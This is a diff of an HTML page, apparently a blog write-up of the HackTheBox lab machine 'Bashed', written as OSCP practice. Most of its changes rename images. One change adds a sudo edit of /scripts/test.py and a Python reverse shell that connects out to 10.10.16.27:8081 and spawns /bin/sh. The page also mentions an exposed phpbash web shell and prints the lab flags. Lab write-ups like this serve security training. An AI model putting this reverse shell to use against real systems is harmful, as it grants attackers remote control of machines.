@@ -24,7 +24,7 @@
       <h1>Bashed – HackTheBox WriteUp</h1>
 
       <div class="big-to-normal-image">
-        <img src="../images/bashed_banner.webp" alt="Bashed Banner">
+        <img src="../images/bashed1.webp" alt="Bashed Banner">
       </div>
 
       <p>This write-up focuses on the Hack The Box machine “Bashed,” which is part of TJnull’s recommended list for OSCP preparation. Bashed centers on web application vulnerabilities, especially the exploitation of file upload flaws and the use of Bash scripting for privilege escalation.</p>
@@ -52,7 +52,7 @@ Nmap done: 1 IP address (1 host up) scanned in 40.12 seconds</pre>
       <p>Upon visiting the website, one detail immediately stood out — a blog post discussing phpbash, a tool known for its utility in penetration testing. This caught my attention as it hinted at potential functionality or vulnerabilities I could leverage. Given this lead, I decided to run a directory brute-forcing scan using ffuf to discover any additional accessible directories or hidden files that might be useful.</p>
 
       <div class="big-to-normal-image">
-        <img src="../images/bashed_port80.webp" alt="Port 80 webpage with phpbash mention">
+        <img src="../images/bashed2.webp" alt="Port 80 webpage with phpbash mention">
       </div>
 
       <h2>/Dev Directory</h2>
@@ -73,14 +73,14 @@ Nmap done: 1 IP address (1 host up) scanned in 40.12 seconds</pre>
       </div>
 
       <div class="big-to-normal-image">
-        <img src="../images/bashed_dev.webp" alt="/dev directory contents">
+        <img src="../images/bashed3.webp" alt="/dev directory contents">
       </div>
 
       <h2>Webshell</h2>
       <p>Upon accessing phpbash.php, I was immediately presented with an interactive web shell running with www-data privileges. This was significant, as it provided a direct line to execute commands on the server, albeit with limited permissions. With this shell, I could start navigating the file system, inspecting critical files, and gathering more information about the environment and its configuration.</p>
 
       <div class="big-to-normal-image">
-        <img src="../images/bashed_phpbash.webp" alt="phpbash web shell">
+        <img src="../images/bashed4.webp" alt="phpbash web shell">
       </div>
 
       <h2>User Flag</h2>
@@ -108,10 +108,6 @@ www-data@bashed:/home/arrexel# cat user.txt
       <h2>Shell Upgrade</h2>
       <p>Before proceeding with privilege escalation, I needed a more stable shell for reliable interaction. To achieve this, I uploaded a shell script to the target that allowed me to establish a direct connection through my local terminal, providing a more stable and responsive environment for executing further commands and tests.</p>
 
-      <div class="big-to-normal-image">
-        <img src="../images/bashed_shell_upgrade.webp" alt="Stable shell upgrade">
-      </div>
-
       <div class="snippet">
         <pre class="code-block">python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
@@ -130,8 +126,20 @@ stty rows 52 columns 236</pre>
       <h2>Sudo</h2>
       <p>Next, I utilized the sudo permissions available to the scriptmanager user to edit the test.py file. I removed the original script that it was executing and replaced it with a Python reverse shell script, then saved the changes. This modification would allow me to gain remote access with elevated privileges when the script was executed by the root user.</p>
 
-      <div class="big-to-normal-image">
-        <img src="../images/bashed_test_py.webp" alt="Editing test.py as scriptmanager">
+      <div class="snippet">
+        <pre class="code-block">www-data@bashed:/home/scriptmanager$ sudo -u scriptmanager nano /scripts/test.py</pre>
+      </div>
+
+      <div class="snippet">
+        <pre class="code-block">
+          import socket, subprocess, os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.10.16.27", 8081))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/sh", "-i"])</pre>
       </div>
 
       <h2>Root</h2>
@@ -146,7 +154,7 @@ baf3c31fab2cafc5902c3215bf94dc16</pre>
       </div>
 
       <div class="big-to-normal-image">
-        <img src="../images/bashed_root.webp" alt="Root shell and flag">
+        <img src="../images/bashed5.webp" alt="Root shell and flag">
       </div>
     </div>
   </div>
